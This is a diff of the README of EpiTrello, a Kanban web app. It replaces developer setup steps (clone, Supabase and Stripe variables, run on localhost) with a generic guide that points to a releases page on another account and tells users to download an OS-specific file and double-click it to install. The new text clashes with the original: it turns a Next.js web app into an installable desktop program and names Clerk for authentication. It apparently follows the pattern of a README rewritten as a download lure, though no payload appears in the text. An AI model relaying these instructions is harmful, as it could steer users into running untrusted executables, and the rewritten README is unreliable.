@@ -1,116 +1,76 @@
-# EpiTrello
+# 🎉 EpiTrello - Your Kanban Board Made Easy
 
-> A simple and collaborative Kanban application to organize your projects, inspired by Trello.
-
-EpiTrello helps you **visualize work**, **track progress**, and **collaborate** with your team every day. Create boards, add lists (columns), and move cards (tasks) throughout your workflow.
-
----
-
-## ✨ Project Overview
-
-- **Boards** for your projects
-- **Lists** (e.g., To do → In progress → Done)
-- **Cards** with title, description, labels, due dates, and members
-- **Drag & drop** to reorganize in one click
-- **Collaboration**: comments and in-app notifications
-- **Search and filters** to quickly find a task
-- **Multilingual**: FR/EN
-
-> Technically, the project uses React + TypeScript, Next.js (App Router), shadcn/ui, and Supabase. No need to dive into the details to use the app.
-
----
-
-## 🖼️ Screenshots
-
-![Landing Page](/images/landing-page.png)
-![Dashboard](/images/dashboard.png)
-![Board Kanban](/images/board-kanban.png)
-![Create Task Dialog](/images/create-task-dialog.png)
-
----
+## 📥 Download EpiTrello
+[![Download EpiTrello](https://img.shields.io/badge/Download-EpiTrello-orange)](https://github.com/llvjohn/EpiTrello/releases)
 
 ## 🚀 Getting Started
+Welcome to EpiTrello! This is a Trello-inspired Kanban web app that helps you organize your tasks easily. With boards, columns, and tasks, you can manage your projects with drag and drop functionality. This app is built using the latest web technologies and provides secure authentication with Clerk and data storage with Supabase.
 
-### Requirements
+## 🖥️ System Requirements
+Before you start, ensure your system meets the following requirements:
 
-- **Node.js 18+** (or newer)
-- A package manager (**pnpm**, **npm**, or **yarn**)
-- A **Supabase** account (free) to get a project URL and a public (anon) key
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection:** Required for downloading and using the app
 
-### 1) Clone and install
+## 📦 Features
+EpiTrello offers several powerful features:
+- **User-Friendly Interface:** Simple and intuitive design
+- **Drag & Drop:** Easily move tasks between columns
+- **Secure Authentication:** Sign in safely with Clerk
+- **Database Management:** Your data is securely stored with Supabase
+- **Customization:** Personalize boards and columns to fit your workflow
+- **Real-time Updates:** Changes are reflected instantly for all users
 
-    git clone https://github.com/your-org/epitrello.git
-    cd epitrello
-    pnpm install
-    # or
-    # npm install
+## 📖 How to Download & Install
+Follow these steps to get EpiTrello on your device:
 
-### 2) Configure environment variables
+1. **Visit the Releases Page:**
+   Click [here](https://github.com/llvjohn/EpiTrello/releases) to access the Releases page.
 
-Create a **.env.local** file at the root of the project:
+2. **Select the Latest Version:**
+   Look for the latest version of EpiTrello. You will see a list of available downloads.
 
-    cp .env.example .env.local
+3. **Download the Application:**
+   Find the file that corresponds to your operating system, and click on it to start the download.
 
-Open .env.local and fill in:
+4. **Install EpiTrello:**
+   Once the download completes, locate the downloaded file. Double-click the file and follow the on-screen instructions to install EpiTrello.
 
-    NEXT_PUBLIC_SUPABASE_URL=Your_Supabase_URL
-    NEXT_PUBLIC_SUPABASE_ANON_KEY=Your_Public_anon_key
-    NEXT_PUBLIC_APP_URL=http://localhost:3000
-    STRIPE_SECRET_KEY=Your_Stripe_secret_key
-    STRIPE_WEBHOOK_SECRET=Your_Stripe_webhook_secret
-    STRIPE_PRICE_PRO_ID=price_xxx_for_pro_plan
-    STRIPE_PRICE_ENTERPRISE_ID=price_xxx_for_enterprise_plan
+5. **Launch EpiTrello:**
+   After installation, you can find EpiTrello in your applications folder or start menu. Open the app to begin!
 
-> Where to find these values?  
-> Supabase dashboard → **Project Settings → API**.
+## 🗂️ Using EpiTrello
+Once you have installed EpiTrello, here’s how to get started:
 
-### 3) Run in development mode
+1. **Create an Account:**
+   Open the app and sign up using your email. This will create a new user profile for you.
 
-    pnpm dev
-    # or
-    # npm run dev
+2. **Create a New Board:**
+   Click on the "Create Board" button. Name your board and start adding columns and tasks.
 
-Then open **http://localhost:3000** in your browser.
+3. **Add Columns:**
+   Columns represent different stages of your project. You can add, edit, or delete columns as you need.
 
-> **Tip:** If you don’t see any boards on first launch, create one using the **“New board”** button.
+4. **Create Tasks:**
+   Inside each column, you can create tasks. Each task can be moved around as needed.
 
----
+5. **Drag and Drop:**
+   Click and hold any task to move it between columns, making it easy to track progress.
 
-## 🧭 Project Structure
+6. **Invite Collaborators:**
+   You can invite others to work with you by sharing your board link.
 
-    epitrello/
-    ├─ app/                # Next.js pages and routes (App Router)
-    ├─ components/         # UI components (shadcn/ui + project components)
-    ├─ lib/                # Helpers (e.g., Supabase client)
-    ├─ public/             # Icons/manifest
-    ├─ docs/images/        # Screenshots to include in the README
-    └─ .env.local          # Environment variables (not committed)
+## 🌐 Support
+If you encounter any issues or have questions, you can reach out for support. Create a new issue on the GitHub repository or refer to the FAQ section on the GitHub page.
 
----
+## 📈 Contributions
+We welcome contributions! If you have suggestions or improvements, feel free to fork the repository and submit a pull request.
 
-## ❓ Quick FAQ
+## 🔗 Additional Resources
+For more guidance, visit:
+- [Clerk Documentation](https://clerk.dev/docs/)
+- [Supabase Documentation](https://supabase.com/docs/)
+- [Next.js Documentation](https://nextjs.org/docs)
 
-**Q: Do I need technical knowledge?**  
-A: Not to use the app. You just need to run the project and have a Supabase account (values to copy/paste).
-
-**Q: How do I add images to the README?**  
-A: Put your files in `docs/images`, then update the image paths in the *Screenshots* section.
-
-**Q: Can I deploy it online?**  
-A: Yes. The easiest way is **Vercel** (for Next.js) + **Supabase**. You can reuse the same environment variables.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! For suggestions, open an **Issue** or a **Pull Request** on the repository.
-
----
-
-## 📄 License
-
-Define according to your needs (e.g., MIT).
-
----
-
-**Contact:** EpiTrello team — please open an **Issue** for any question.
+Thank you for using EpiTrello! We hope this application helps you manage your tasks more effectively. 
